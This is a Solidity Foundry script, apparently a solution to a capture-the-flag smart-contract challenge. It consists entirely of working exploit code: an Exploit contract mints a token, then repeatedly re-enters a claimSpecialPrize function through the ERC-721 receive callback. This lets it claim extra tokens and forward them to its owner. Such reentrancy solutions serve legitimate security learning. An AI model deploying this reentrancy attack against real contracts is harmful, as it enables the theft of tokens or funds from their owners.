// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "forge-std/Script.sol";

interface IBeyond {
    function mint() external payable;
    function claimSpecialPrize() external;
}

interface IAbove {
    function transferFrom(address, address, uint256) external;
}

interface IChallenge {
    function beyond() external view returns(address);
    function above() external view returns(address);
}

contract Solve is Script {

    Exploit exploit;

    // Put the Challenge address below
    IChallenge challenge = IChallenge(0x1b6f9c0C1df524a887f292b7bca0e2Afeb6f05e3);

    function run() public {
        vm.startBroadcast();

        exploit = new Exploit{value : 1 ether}(challenge.beyond(), challenge.above());
        exploit.attack();

        vm.stopBroadcast();
    }
}

contract Exploit {

    address owner;
    IBeyond beyond;
    IAbove above;
    uint256 constant tokensToClaim = 6;
    uint256 tokensClaimed;

    constructor(address _beyond, address _above) payable {
        owner = msg.sender;
        beyond = IBeyond(_beyond);
        above = IAbove(_above);
        beyond.mint{value : 1 ether}();
    }

    function attack() external {
        beyond.claimSpecialPrize();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // transfer the received token to the player
        above.transferFrom(address(this), owner, tokenId);

        if(tokensClaimed < tokensToClaim) {
            tokensClaimed++;
            beyond.claimSpecialPrize();
        }
        return this.onERC721Received.selector;
    }
}
